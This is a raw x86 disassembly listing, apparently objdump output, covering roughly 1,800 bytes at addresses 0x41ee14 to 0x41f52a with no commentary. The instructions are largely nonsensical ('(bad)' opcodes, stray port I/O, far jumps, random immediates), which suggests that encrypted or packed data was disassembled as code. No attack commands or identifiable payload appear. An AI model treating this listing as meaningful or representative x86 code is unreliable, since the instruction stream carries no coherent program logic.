  41ee14:	or     BYTE PTR [ecx],dh
  41ee16:	jg     0x41ee17
  41ee18:	lahf   
  41ee19:	push   ebp
  41ee1a:	ja     0x41ee01
  41ee1c:	jnp    0x41ee54
  41ee1e:	dec    eax
  41ee1f:	jno    0x41edaa
  41ee21:	gs pop esi
  41ee23:	xlat   BYTE PTR ds:[ebx]
  41ee24:	dec    edi
  41ee25:	icebp  
  41ee26:	or     eax,0xa73a8058
  41ee2b:	mov    ds:0x7457b6f9,eax
  41ee30:	test   al,0x4c
  41ee32:	inc    edx
  41ee33:	pop    eax
  41ee34:	aaa    
  41ee35:	or     eax,0xc929feb0
  41ee3a:	out    0xaa,al
  41ee3c:	fwait
  41ee3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee3e:	clc    
  41ee3f:	add    eax,0x26e7259
  41ee44:	or     bl,BYTE PTR [ebp-0x2b]
  41ee47:	outs   dx,BYTE PTR ds:[esi]
  41ee48:	enter  0x3eda,0xa6
  41ee4c:	arpl   ax,si
  41ee4e:	cld    
  41ee4f:	pop    ecx
  41ee50:	sub    al,0xd
  41ee52:	pop    ds
  41ee53:	or     al,0x77
  41ee55:	push   esi
  41ee56:	adc    dh,bl
  41ee58:	xchg   ebx,eax
  41ee59:	mov    dl,0xd5
  41ee5b:	mov    ebp,0xe2140f49
  41ee60:	xlat   BYTE PTR ds:[ebx]
  41ee61:	add    esp,edx
  41ee63:	fnstcw WORD PTR [edi+0x42]
  41ee66:	jmp    0xf831:0x393303a5
  41ee6d:	jns    0x41ee5d
  41ee6f:	push   ebp
  41ee70:	not    BYTE PTR [edx]
  41ee72:	ins    BYTE PTR es:[edi],dx
  41ee73:	ins    BYTE PTR es:[edi],dx
  41ee74:	push   esi
  41ee75:	jne    0x41ee30
  41ee77:	sbb    DWORD PTR [edi],0x53a7196a
  41ee7d:	jge    0x41ee99
  41ee7f:	add    eax,0xd929aa40
  41ee84:	cmp    al,0xbc
  41ee86:	xor    al,0x97
  41ee88:	jno    0x41ee36
  41ee8a:	pusha  
  41ee8b:	cmp    ebp,DWORD PTR [edi+0x18]
  41ee8e:	mov    ebp,0x46c090e8
  41ee93:	jp     0x41ee98
  41ee95:	push   edi
  41ee96:	sbb    ebp,DWORD PTR [ebx-0x28308291]
  41ee9c:	xlat   BYTE PTR ds:[ebx]
  41ee9d:	jp     0x41ee9d
  41ee9f:	out    0xd1,eax
  41eea1:	imul   edx,DWORD PTR [esp+ecx*8+0x63],0x5a648fc
  41eea9:	gs xchg edi,eax
  41eeab:	mov    dl,0x2e
  41eead:	rcr    BYTE PTR [esi+0x5320a999],0x97
  41eeb4:	hlt    
  41eeb5:	lds    ebp,FWORD PTR [esi-0x37]
  41eeb8:	adc    BYTE PTR [ecx-0x29],0xb0
  41eebc:	fdivr  DWORD PTR [ecx+0x4e]
  41eebf:	push   ebx
  41eec0:	outs   dx,DWORD PTR cs:[esi]
  41eec2:	(bad)  
  41eec3:	push   ss
  41eec4:	mov    BYTE PTR [edi+edx*8+0x79],dl
  41eec8:	push   ecx
  41eec9:	pop    ecx
  41eeca:	test   DWORD PTR [esp+ebp*2],ecx
  41eecd:	inc    eax
  41eece:	clc    
  41eecf:	inc    eax
  41eed0:	jle    0x41eee2
  41eed2:	cmp    BYTE PTR [edx+0x6f],al
  41eed5:	not    BYTE PTR [ecx]
  41eed7:	(bad)  
  41eed8:	pop    ss
  41eed9:	inc    ecx
  41eedb:	stos   BYTE PTR es:[edi],al
  41eedc:	push   ecx
  41eedd:	mov    DWORD PTR [ebp-0x7bd9083],edi
  41eee3:	stc    
  41eee4:	out    0xf9,al
  41eee6:	jecxz  0x41eeb8
  41eee8:	jecxz  0x41eeba
  41eeea:	ss jmp 0x76ac8dc9
  41eef0:	cmp    al,0xb0
  41eef2:	sub    al,0x85
  41eef4:	loop   0x41ef72
  41eef6:	push   ebx
  41eef7:	fsubr  DWORD PTR [ecx+0x691b9441]
  41eefd:	gs call 0xc87f4707
  41ef03:	push   ecx
  41ef04:	mov    al,0x61
  41ef06:	jb     0x41eee0
  41ef08:	lods   eax,DWORD PTR ds:[esi]
  41ef09:	imul   edi,DWORD PTR [ebp+eiz*2+0x53],0x68
  41ef0e:	fucom  st(5)
  41ef10:	and    dl,BYTE PTR [ecx+0x7f]
  41ef13:	ret    0x6438
  41ef16:	out    0x77,eax
  41ef18:	adc    dl,BYTE PTR [edi-0x6f]
  41ef1b:	cdq    
  41ef1c:	push   ebx
  41ef1d:	mov    esp,0x146a29d7
  41ef22:	jae    0x41efa1
  41ef24:	push   edx
  41ef25:	cmp    eax,0xe46c2703
  41ef2a:	adc    bh,BYTE PTR [edx]
  41ef2c:	jp     0x41ef91
  41ef2e:	nop
  41ef2f:	sub    BYTE PTR [esi],0x6b
  41ef32:	lods   eax,DWORD PTR ds:[esi]
  41ef33:	push   edx
  41ef34:	(bad)  
  41ef35:	mov    esi,0x3717fddb
  41ef3a:	dec    eax
  41ef3b:	cmp    al,0x8e
  41ef3d:	inc    ecx
  41ef3e:	mov    BYTE PTR fs:[eax+0x7401c556],ah
  41ef45:	jne    0x41ef38
  41ef47:	sub    BYTE PTR [esi+edi*4-0x229afbfd],dh
  41ef4e:	push   ss
  41ef4f:	fisttp WORD PTR [edi]
  41ef51:	mov    ebp,0xb67dfd64
  41ef56:	sub    ecx,0xfff784e2
  41ef5c:	(bad)  
  41ef5d:	cmp    BYTE PTR [ebx+0x55b17410],al
  41ef63:	(bad)  
  41ef64:	in     al,0x53
  41ef66:	sbb    ebp,DWORD PTR [eax]
  41ef68:	lods   al,BYTE PTR ds:[esi]
  41ef69:	or     ah,BYTE PTR [eax]
  41ef6b:	inc    eax
  41ef6c:	and    BYTE PTR [eax],bl
  41ef6e:	lea    eax,[ebx]
  41ef70:	sub    BYTE PTR [esi+0x5d225959],dl
  41ef76:	mov    cl,0x9
  41ef78:	clc    
  41ef79:	sar    BYTE PTR [eax+0x5],cl
  41ef7c:	mov    BYTE PTR [ebp-0x7dc4ecdf],ah
  41ef82:	bound  edx,QWORD PTR [ebx-0x3b]
  41ef85:	cmp    eax,0xca2ebe01
  41ef8a:	dec    edi
  41ef8b:	xchg   ecx,eax
  41ef8c:	test   eax,0xe2ca6382
  41ef91:	sbb    eax,0xa3415410
  41ef96:	fild   QWORD PTR [eax]
  41ef98:	push   ds
  41ef99:	mov    ds:0x39d9604d,al
  41ef9e:	stos   DWORD PTR es:[edi],eax
  41ef9f:	or     DWORD PTR [edi-0x20],edx
  41efa2:	dec    esp
  41efa3:	mov    ds:0x3fa5873a,eax
  41efa8:	sti    
  41efa9:	push   edx
  41efaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efab:	fild   WORD PTR ss:[esi]
  41efae:	icebp  
  41efaf:	fsub   st(1),st
  41efb1:	cwde   
  41efb2:	stos   DWORD PTR es:[edi],eax
  41efb3:	xlat   BYTE PTR ds:[ebx]
  41efb4:	in     al,dx
  41efb5:	pop    ebx
  41efb6:	pop    edx
  41efb7:	sub    ebx,DWORD PTR [ebx+0x20ceaccc]
  41efbd:	into   
  41efbe:	test   BYTE PTR [eax+0x773781ed],bl
  41efc4:	jecxz  0x41f028
  41efc6:	fst    QWORD PTR [edx-0x54df24bb]
  41efcc:	add    al,BYTE PTR [edx+ebp*1+0x71d6c2c8]
  41efd3:	test   BYTE PTR [ebx],0x98
  41efd6:	(bad)  
  41efd7:	nop
  41efd8:	imul   edi,eax,0x134812c
  41efde:	pop    es
  41efdf:	scas   eax,DWORD PTR es:[edi]
  41efe0:	lds    ebp,FWORD PTR [eax+0x39]
  41efe3:	add    ch,BYTE PTR [eax-0x3e]
  41efe6:	fwait
  41efe7:	pop    ds
  41efe8:	sahf   
  41efe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efea:	pop    ss
  41efeb:	repz aam 0xa6
  41efee:	mov    BYTE PTR [edi],dl
  41eff0:	outs   dx,DWORD PTR ds:[esi]
  41eff2:	fwait
  41eff3:	imul   DWORD PTR [ebx]
  41eff5:	push   cs
  41eff6:	shr    DWORD PTR [ebp+0x25],1
  41eff9:	pushf  
  41effa:	sbb    DWORD PTR [ebx],ebx
  41effc:	push   0xffffffbe
  41effe:	sbb    BYTE PTR [ebx],dh
  41f000:	(bad)  
  41f001:	(bad)  
  41f002:	(bad)  
  41f003:	push   ds
  41f004:	inc    esi
  41f005:	pop    es
  41f006:	mov    dl,0xc9
  41f008:	pushf  
  41f009:	rol    DWORD PTR [edx],1
  41f00b:	not    DWORD PTR [ebp-0x7f]
  41f00e:	dec    ebx
  41f00f:	mov    bl,0x39
  41f011:	fs jecxz 0x41f001
  41f014:	cli    
  41f015:	sahf   
  41f016:	mov    WORD PTR [edi],fs
  41f018:	std    
  41f019:	sub    BYTE PTR [ecx-0x2],al
  41f01c:	hlt    
  41f01d:	hlt    
  41f01e:	xchg   ebp,eax
  41f01f:	out    0x3f,eax
  41f021:	and    edi,DWORD PTR [si-0x2710]
  41f026:	hlt    
  41f027:	stos   DWORD PTR es:[edi],eax
  41f028:	xchg   DWORD PTR [ebx+ebp*4+0x5fad4278],edi
  41f02f:	or     eax,edx
  41f031:	push   ecx
  41f032:	or     DWORD PTR [eax-0x36],ebx
  41f035:	and    edi,esp
  41f037:	pusha  
  41f038:	popf   
  41f039:	mov    ds,WORD PTR [eax]
  41f03b:	and    eax,0x2cd623b6
  41f040:	js     0x41efd7
  41f042:	xchg   ebx,eax
  41f043:	xor    dl,0x9d
  41f046:	xchg   DWORD PTR [esp+ebp*8+0x1],esi
  41f04a:	ret    
  41f04b:	pop    esi
  41f04c:	or     al,0x74
  41f04e:	dec    edx
  41f04f:	dec    ebp
  41f050:	(bad)  
  41f051:	hlt    
  41f052:	loope  0x41f01d
  41f054:	or     BYTE PTR [ebp+eax*8-0x3965a3f5],al
  41f05b:	arpl   WORD PTR [edx+0x4],ax
  41f05e:	pushf  
  41f05f:	mov    eax,ds:0x4413d8ef
  41f064:	cs rol dh,1
  41f067:	adc    eax,0xd0339869
  41f06c:	push   0x50
  41f06e:	fcomp  st(1)
  41f070:	aam    0xc6
  41f072:	mov    bl,0x34
  41f074:	outs   dx,DWORD PTR ds:[esi]
  41f075:	clc    
  41f076:	jge    0x41f08c
  41f078:	dec    ecx
  41f079:	div    BYTE PTR [esi]
  41f07b:	jl     0x41f020
  41f07d:	shr    DWORD PTR [eax-0x15f0250],0xce
  41f084:	sub    eax,DWORD PTR [edi]
  41f086:	shr    DWORD PTR [edi-0x1a524c5a],0xab
  41f08d:	adc    DWORD PTR [bp-0x279],ebp
  41f092:	lods   eax,DWORD PTR ds:[esi]
  41f093:	cmp    esi,eax
  41f095:	aas    
  41f096:	inc    edi
  41f097:	retf   0xcdd
  41f09a:	ficom  DWORD PTR [edi]
  41f09c:	and    esp,DWORD PTR [ebx-0x35d15516]
  41f0a2:	neg    edx
  41f0a4:	sbb    BYTE PTR [edi+0x63],dl
  41f0a7:	dec    eax
  41f0a8:	add    ah,0x46
  41f0ab:	ds xchg ecx,eax
  41f0ad:	mov    dl,0x67
  41f0af:	scas   eax,DWORD PTR es:[edi]
  41f0b0:	and    eax,0xe1c7de6b
  41f0b5:	je     0x41f118
  41f0b7:	pop    esi
  41f0b8:	ficom  DWORD PTR [ecx]
  41f0ba:	rol    BYTE PTR [edx-0x6ac6c91f],cl
  41f0c0:	adc    esi,DWORD PTR [ecx]
  41f0c2:	std    
  41f0c3:	mov    dl,0x36
  41f0c5:	mov    ds:0xb6840b67,eax
  41f0ca:	jne    0x41f114
  41f0cc:	mov    BYTE PTR [ebx],0x6c
  41f0cf:	out    dx,eax
  41f0d0:	adc    BYTE PTR [ecx+0x3dfbbb5e],al
  41f0d6:	data16 mov dl,0x20
  41f0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0da:	jl     0x41f150
  41f0dc:	mov    eax,0x8adab914
  41f0e1:	imul   edx,edi,0xffffffee
  41f0e4:	push   0x4d40850d
  41f0e9:	ins    DWORD PTR es:[edi],dx
  41f0ea:	loopne 0x41f0b5
  41f0ec:	mov    bh,0xf6
  41f0ee:	mov    edi,ebp
  41f0f0:	fadd   QWORD PTR [ebx+esi*4]
  41f0f3:	xchg   ecx,eax
  41f0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f5:	loop   0x41f0fa
  41f0f7:	pop    esi
  41f0f8:	dec    esi
  41f0f9:	out    0x8d,al
  41f0fb:	mov    edi,0xaaccd5fe
  41f100:	bnd js 0x41f125
  41f103:	cmc    
  41f104:	fst    QWORD PTR [edx+0x3025445b]
  41f10a:	jb     0x41f0e7
  41f10c:	daa    
  41f10d:	fst    DWORD PTR [ebx+esi*1-0x1e]
  41f111:	mov    ebx,0x34d21438
  41f116:	cmp    ebp,edi
  41f118:	test   ah,bl
  41f11a:	jmp    0x3b3f03b3
  41f11f:	leave  
  41f120:	inc    esi
  41f121:	mov    ds:0xa497e3b,al
  41f126:	dec    ebp
  41f127:	mov    ds:0x19b339e0,al
  41f12c:	sbb    al,0x4c
  41f12e:	retf   
  41f12f:	pop    ebx
  41f130:	or     edx,DWORD PTR [edi]
  41f132:	lods   eax,DWORD PTR ds:[esi]
  41f133:	out    dx,eax
  41f134:	push   ss
  41f135:	das    
  41f136:	lods   eax,DWORD PTR ds:[esi]
  41f137:	sbb    bl,cl
  41f139:	scas   al,BYTE PTR es:[edi]
  41f13a:	mov    ah,0x97
  41f13c:	mov    dl,0x34
  41f13e:	test   eax,0x1c530e55
  41f143:	je     0x41f14f
  41f145:	jo     0x41f107
  41f147:	dec    ebp
  41f148:	pop    esp
  41f149:	push   cs
  41f14a:	inc    eax
  41f14b:	(bad)  
  41f14c:	adc    BYTE PTR [ebp+0x5a],dl
  41f14f:	mov    ebx,DWORD PTR [esp]
  41f152:	and    BYTE PTR cs:[eax+0x1f],0x31
  41f157:	add    BYTE PTR [eax],cl
  41f159:	sub    esp,DWORD PTR [esi+0x6f]
  41f15c:	jo     0x41f173
  41f15e:	mov    edx,0x170da949
  41f163:	xor    dl,al
  41f165:	je     0x41f117
  41f167:	inc    ecx
  41f168:	mov    al,ds:0xd685ff80
  41f16d:	add    al,0x44
  41f16f:	inc    ecx
  41f170:	repz (bad) 
  41f172:	in     eax,dx
  41f173:	sti    
  41f174:	add    al,0x0
  41f176:	and    eax,0xcc492295
  41f17b:	cmp    al,0x6
  41f17d:	dec    edi
  41f17e:	icebp  
  41f17f:	xlat   BYTE PTR ds:[ebx]
  41f180:	cs push ecx
  41f182:	pop    ebx
  41f183:	shr    DWORD PTR [ecx-0x30],cl
  41f186:	jne    0x41f1af
  41f188:	shr    DWORD PTR [ecx],0xce
  41f18b:	add    dh,BYTE PTR [esi]
  41f18d:	inc    eax
  41f18e:	mov    WORD PTR [ebx+0x77],es
  41f191:	imul   ebp,DWORD PTR [edx-0x6],0xb1f1050c
  41f198:	sub    BYTE PTR [esi+0x59e03ae5],cl
  41f19e:	(bad)  
  41f19f:	cwde   
  41f1a0:	cdq    
  41f1a1:	and    dh,BYTE PTR [edi-0x59d47beb]
  41f1a7:	popf   
  41f1a8:	xor    edx,DWORD PTR [edx]
  41f1aa:	dec    esi
  41f1ab:	cwde   
  41f1ac:	out    0x68,al
  41f1ae:	push   edx
  41f1af:	jmp    0x5e687edb
  41f1b4:	dec    eax
  41f1b5:	jle    0x41f236
  41f1b7:	jbe    0x41f158
  41f1b9:	jns    0x41f1b9
  41f1bb:	leave  
  41f1bc:	mov    ds:0x72492b9c,eax
  41f1c1:	jne    0x41f1f3
  41f1c3:	in     al,dx
  41f1c4:	and    al,0x4d
  41f1c6:	pop    ss
  41f1c7:	add    eax,DWORD PTR [edx-0x7e]
  41f1ca:	adc    BYTE PTR [ebx+0x66],al
  41f1cd:	mov    cl,0xee
  41f1cf:	stc    
  41f1d0:	dec    ebx
  41f1d1:	les    eax,FWORD PTR [edx]
  41f1d3:	push   edx
  41f1d4:	and    DWORD PTR [ebx-0x48943c2f],0xd32d5977
  41f1de:	arpl   bp,bx
  41f1e0:	xor    ch,ch
  41f1e2:	jecxz  0x41f209
  41f1e4:	inc    BYTE PTR [edx+0x9cb868c]
  41f1ea:	jl     0x41f251
  41f1ec:	xor    dh,BYTE PTR [esi-0x60]
  41f1ef:	inc    ebp
  41f1f0:	out    dx,al
  41f1f1:	(bad)  
  41f1f2:	(bad)  
  41f1f3:	ja     0x41f1bd
  41f1f5:	sbb    dh,BYTE PTR [ecx+0x5dca8586]
  41f1fb:	(bad)  
  41f1fc:	loope  0x41f1d9
  41f1fe:	icebp  
  41f1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f200:	cmc    
  41f201:	stos   DWORD PTR es:[edi],eax
  41f202:	es ja  0x41f1e2
  41f205:	inc    eax
  41f206:	es dec ecx
  41f208:	daa    
  41f209:	mov    WORD PTR [esi],ss
  41f20b:	adc    DWORD PTR ds:0x5f7bb006,ebx
  41f211:	mov    al,ds:0xa0e51f44
  41f216:	stos   DWORD PTR es:[edi],eax
  41f217:	jecxz  0x41f27a
  41f219:	pop    eax
  41f21a:	sti    
  41f21b:	ds add ebp,edx
  41f21e:	mov    ebx,ecx
  41f220:	cmp    BYTE PTR [eax],dh
  41f222:	pusha  
  41f223:	dec    esp
  41f224:	or     al,0x3a
  41f226:	xchg   edi,eax
  41f227:	push   0xffffffc3
  41f229:	mov    ecx,0x4c46641f
  41f22e:	les    eax,FWORD PTR [edx]
  41f230:	add    al,0xa0
  41f232:	pop    ds
  41f233:	mov    edi,0x1d2fedae
  41f238:	dec    eax
  41f239:	push   ebp
  41f23a:	inc    edi
  41f23b:	cmc    
  41f23c:	push   ecx
  41f23d:	push   ebx
  41f23e:	adc    esi,DWORD PTR [edx+ecx*2-0x4d]
  41f242:	mov    ds,WORD PTR [edx]
  41f244:	fnop   
  41f246:	into   
  41f247:	and    al,0x5b
  41f249:	cdq    
  41f24a:	add    eax,0x9c458619
  41f24f:	and    eax,DWORD PTR ds:0xd26433bf
  41f255:	sbb    BYTE PTR [ecx+0x17],ah
  41f258:	mov    al,ds:0x30a2f980
  41f25d:	xchg   edx,eax
  41f25e:	push   esi
  41f25f:	lock fwait
  41f261:	and    DWORD PTR ds:0xa1c3a503,ecx
  41f267:	and    eax,0xcf19e216
  41f26c:	xchg   esi,eax
  41f26d:	mov    edi,0x499b12db
  41f272:	cmp    DWORD PTR [ebx-0x11],ebx
  41f275:	leave  
  41f276:	scas   al,BYTE PTR es:[edi]
  41f277:	push   esp
  41f278:	retf   
  41f279:	sub    dh,BYTE PTR [ecx-0x52]
  41f27c:	add    ch,0x77
  41f27f:	lods   al,BYTE PTR ds:[esi]
  41f280:	mov    bl,BYTE PTR [edi]
  41f282:	aas    
  41f283:	cmp    edi,DWORD PTR [edi+0x3f8509c8]
  41f289:	adc    ecx,DWORD PTR [ecx+0x505370a7]
  41f28f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f290:	jl     0x41f310
  41f292:	ret    0x197e
  41f295:	mov    edx,0xbdbb1b80
  41f29a:	punpcklbw mm0,DWORD PTR [ebx-0x7cea39d5]
  41f2a1:	sbb    DWORD PTR [ecx],edx
  41f2a3:	in     eax,0x21
  41f2a5:	test   eax,0x61c4f992
  41f2aa:	adc    DWORD PTR [ebp-0x71],esi
  41f2ad:	cld    
  41f2ae:	rcl    ebx,0xae
  41f2b1:	cdq    
  41f2b2:	imul   eax,DWORD PTR [eax-0x6f],0xffffffea
  41f2b6:	xor    DWORD PTR [eax+eax*1],ecx
  41f2b9:	push   edi
  41f2ba:	sti    
  41f2bb:	mov    ds:0xcb373a63,eax
  41f2c0:	mov    esi,0xf71b5471
  41f2c5:	gs xor eax,0x6e853c17
  41f2cb:	cwde   
  41f2cc:	sti    
  41f2cd:	in     eax,0xf5
  41f2cf:	in     eax,dx
  41f2d0:	or     ebp,DWORD PTR ds:0xd6ea193f
  41f2d6:	and    esp,DWORD PTR [eax-0x72]
  41f2d9:	test   BYTE PTR [eax+0x2b],dh
  41f2dc:	lods   al,BYTE PTR ds:[esi]
  41f2dd:	and    al,0x7d
  41f2df:	popa   
  41f2e0:	icebp  
  41f2e1:	adc    eax,0x1bde878b
  41f2e7:	xor    eax,0xfa8b0a13
  41f2ec:	mov    ds:0xddbaebce,eax
  41f2f1:	aad    0xbc
  41f2f3:	shl    BYTE PTR [edx-0x1e],1
  41f2f6:	sub    eax,0x534eea1e
  41f2fb:	add    dh,BYTE PTR [edi+edi*1-0x78]
  41f2ff:	sub    al,0xb0
  41f301:	mov    dl,0x29
  41f303:	xchg   ecx,edx
  41f305:	test   BYTE PTR [edx],0x92
  41f308:	dec    edx
  41f309:	mov    cl,0x77
  41f30b:	fild   QWORD PTR ds:0x508d8143
  41f311:	push   edx
  41f312:	cmp    al,0x27
  41f314:	imul   ebp,ebx,0x43
  41f317:	add    DWORD PTR [esi-0x4d8c15ee],edx
  41f31d:	sbb    BYTE PTR [esi+0x4e],cl
  41f320:	cli    
  41f321:	(bad)  
  41f322:	jne    0x41f354
  41f324:	imul   eax,DWORD PTR [edi],0xffffff9f
  41f327:	xchg   BYTE PTR [esi+0x70],dl
  41f32a:	mov    ebx,0xeb156b39
  41f32f:	jae    0x41f36a
  41f331:	xor    edx,DWORD PTR [edx-0x16d6651]
  41f337:	dec    ebx
  41f338:	daa    
  41f339:	pusha  
  41f33a:	or     DWORD PTR [esi+ebp*1],ebx
  41f33d:	xlat   BYTE PTR ds:[ebx]
  41f33e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f33f:	push   0xffffffc3
  41f341:	pop    esi
  41f342:	adc    ebp,DWORD PTR [eax+0xc07acdd]
  41f348:	std    
  41f349:	outs   dx,BYTE PTR ds:[esi]
  41f34a:	cli    
  41f34b:	mov    eax,cs
  41f34d:	adc    bh,BYTE PTR [ebx-0x4b]
  41f350:	fdiv   st(7),st
  41f352:	push   ecx
  41f353:	cmp    BYTE PTR [esi+esi*4-0x68d517ed],dl
  41f35a:	or     ebp,DWORD PTR [edx-0x2490af03]
  41f360:	enter  0x6c03,0x9c
  41f364:	and    ebx,DWORD PTR [edx+0x27]
  41f367:	in     al,dx
  41f368:	fisubr DWORD PTR ds:0x7a3af35c
  41f36e:	out    0xbe,al
  41f370:	xor    esi,DWORD PTR ds:0xece2ae44
  41f376:	enter  0xea86,0x1a
  41f37a:	jno    0x41f3b0
  41f37c:	push   edx
  41f37d:	mov    dh,0xc
  41f37f:	mov    ecx,0xce4135f0
  41f384:	data16 out dx,al
  41f386:	or     edx,DWORD PTR [ecx-0x78c4daa2]
  41f38c:	lods   al,BYTE PTR ds:[esi]
  41f38d:	data16 lock cmp bh,ah
  41f391:	mov    ah,0x11
  41f393:	inc    eax
  41f394:	xchg   esi,eax
  41f395:	leave  
  41f396:	and    edi,DWORD PTR [edi+esi*8-0x52]
  41f39a:	frstor [esi+esi*2+0x5daf245e]
  41f3a1:	push   ss
  41f3a2:	cmp    BYTE PTR [edx+0x3],cl
  41f3a5:	test   ebp,0x4ff08869
  41f3ab:	cmp    ecx,esp
  41f3ad:	pop    ecx
  41f3ae:	and    eax,0x81d96660
  41f3b3:	leave  
  41f3b4:	add    DWORD PTR [eax],0xffffffe1
  41f3b7:	mov    dh,0xe5
  41f3b9:	outs   dx,BYTE PTR ds:[esi]
  41f3ba:	addr16 jo 0x41f345
  41f3bd:	and    bh,BYTE PTR [eax-0x7b]
  41f3c0:	lahf   
  41f3c1:	int3   
  41f3c2:	inc    edx
  41f3c3:	popa   
  41f3c4:	pop    ebp
  41f3c5:	or     ecx,esi
  41f3c7:	lahf   
  41f3c8:	dec    ebp
  41f3c9:	rcr    DWORD PTR [esi],0x77
  41f3cc:	inc    esi
  41f3cd:	push   ss
  41f3ce:	adc    BYTE PTR [eax+0x2306e061],dh
  41f3d4:	and    al,0x34
  41f3d6:	push   ecx
  41f3d7:	push   es
  41f3d8:	cs das 
  41f3da:	js     0x41f381
  41f3dc:	xchg   edi,eax
  41f3dd:	xchg   ebx,eax
  41f3de:	dec    esi
  41f3df:	pop    esi
  41f3e0:	cmp    cl,bl
  41f3e2:	jns    0x41f3b6
  41f3e4:	shr    ebx,1
  41f3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3e7:	rol    DWORD PTR [eax-0x6f],cl
  41f3ea:	stos   DWORD PTR es:[edi],eax
  41f3eb:	or     eax,0x11cec8e3
  41f3f0:	ss (bad) 
  41f3f2:	and    eax,0xa962f774
  41f3f7:	jb     0x41f3be
  41f3f9:	or     dh,dl
  41f3fb:	arpl   WORD PTR [ebp-0x53],cx
  41f3fe:	repnz daa 
  41f400:	lods   al,BYTE PTR ds:[esi]
  41f401:	int3   
  41f402:	sbb    BYTE PTR [eax],ah
  41f404:	rcr    BYTE PTR [eax-0x1fad17c1],0xca
  41f40b:	push   edi
  41f40c:	loopne 0x41f3ba
  41f40e:	iret   
  41f40f:	(bad)  
  41f410:	mov    ds:0x775f28d2,al
  41f415:	dec    edx
  41f416:	rol    BYTE PTR [ebx+0x39],cl
  41f419:	dec    DWORD PTR [edi+0x269e1395]
  41f41f:	jmp    0xbf29:0x92bc82e4
  41f426:	fwait
  41f427:	xchg   esp,eax
  41f428:	cmc    
  41f429:	addr16 loop 0x41f41d
  41f42c:	cdq    
  41f42d:	add    eax,0xc0b757be
  41f432:	jp     0x41f3f2
  41f434:	xchg   esi,eax
  41f435:	xor    esp,DWORD PTR [esi]
  41f437:	adc    DWORD PTR [eax],ebx
  41f439:	(bad)  
  41f43a:	bnd jnp 0x41f46a
  41f43d:	cdq    
  41f43e:	and    al,0xed
  41f440:	test   al,0xd8
  41f442:	add    ecx,ebx
  41f444:	mov    ecx,DWORD PTR [ebx+ebp*8]
  41f447:	dec    ecx
  41f448:	mov    cl,0xed
  41f44a:	mov    dl,0x3f
  41f44c:	or     bl,BYTE PTR [ebx]
  41f44e:	jae    0x41f495
  41f450:	inc    edx
  41f451:	or     bh,ah
  41f453:	mov    dh,0xd
  41f455:	sbb    eax,0x40e07931
  41f45a:	sbb    ecx,DWORD PTR [edi+eax*2-0x417b0964]
  41f461:	mov    cl,0x71
  41f463:	cmp    DWORD PTR ds:0xc9d2e0fe,ebx
  41f469:	inc    esi
  41f46a:	popa   
  41f46b:	xor    eax,esp
  41f46d:	es push es
  41f46f:	int    0x90
  41f471:	or     edi,esp
  41f473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f474:	aas    
  41f475:	cmp    ebp,DWORD PTR [esi]
  41f477:	loope  0x41f437
  41f479:	in     al,0xd0
  41f47b:	sbb    eax,0xb1366f29
  41f480:	leave  
  41f481:	enter  0x1404,0x16
  41f485:	sbb    bl,BYTE PTR [edx]
  41f487:	bound  eax,QWORD PTR [ecx]
  41f489:	dec    edi
  41f48a:	xor    DWORD PTR [eax+0x13],esi
  41f48d:	rcl    DWORD PTR [eax],cl
  41f48f:	mov    al,0xc1
  41f491:	fninit 
  41f493:	in     al,dx
  41f494:	arpl   dx,si
  41f496:	add    DWORD PTR [ebx],ebp
  41f498:	jae    0x41f4d1
  41f49a:	std    
  41f49b:	sub    BYTE PTR [edx],0xad
  41f49e:	pop    es
  41f49f:	or     al,0x43
  41f4a1:	push   cs
  41f4a2:	dec    ebp
  41f4a3:	jo     0x41f45f
  41f4a5:	xchg   al,ah
  41f4a7:	and    DWORD PTR [ecx-0x46075ab2],edi
  41f4ad:	mov    es,WORD PTR [ebx+0x30]
  41f4b0:	(bad)  
  41f4b2:	push   eax
  41f4b3:	retf   0xcc9
  41f4b6:	cmc    
  41f4b7:	or     ch,BYTE PTR [edi]
  41f4b9:	jo     0x41f4d2
  41f4bb:	sub    DWORD PTR [edx-0x6b776dc8],ebx
  41f4c1:	inc    esi
  41f4c2:	jle    0x41f45f
  41f4c4:	push   0x32
  41f4c6:	out    0x8b,al
  41f4c8:	imul   ecx,ecx,0x58
  41f4cb:	push   ecx
  41f4cc:	xchg   BYTE PTR [ecx-0x50bba6f5],bl
  41f4d2:	mov    bl,0x16
  41f4d4:	mov    bh,0x41
  41f4d6:	(bad)  
  41f4d8:	fist   DWORD PTR [eax+0x58]
  41f4db:	jecxz  0x41f551
  41f4dd:	arpl   si,ax
  41f4df:	outs   dx,DWORD PTR ds:[esi]
  41f4e0:	lock (bad) 
  41f4e2:	(bad)  
  41f4e3:	les    edi,FWORD PTR [esi+0x30]
  41f4e6:	push   ebp
  41f4e7:	(bad)  
  41f4e8:	sub    al,BYTE PTR [esi-0x21]
  41f4eb:	xchg   ebx,eax
  41f4ec:	into   
  41f4ed:	cmp    BYTE PTR [ecx-0x5a],bl
  41f4f0:	mov    ebp,0x734296ad
  41f4f5:	test   dl,bh
  41f4f7:	sub    eax,0x28fa6e30
  41f4fc:	sbb    al,0xa2
  41f4fe:	hlt    
  41f4ff:	lds    esp,FWORD PTR [ebx-0x3bef8573]
  41f505:	cmp    BYTE PTR [edx],cl
  41f507:	xchg   edx,eax
  41f508:	xor    bl,BYTE PTR [esi]
  41f50a:	iret   
  41f50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f50c:	add    al,0xd
  41f50e:	cmp    DWORD PTR [edi+edi*4],esp
  41f511:	fild   DWORD PTR [edi-0x253a84c]
  41f517:	loop   0x41f4e2
  41f519:	or     DWORD PTR [edx+0x1ec28ac4],edx
  41f51f:	jge    0x41f4c1
  41f521:	rol    BYTE PTR [ecx],1
  41f523:	clts   
  41f525:	lock inc eax
  41f527:	stos   BYTE PTR es:[edi],al
  41f528:	xchg   dx,ax
  41f52a:	jle    0x41f4ed
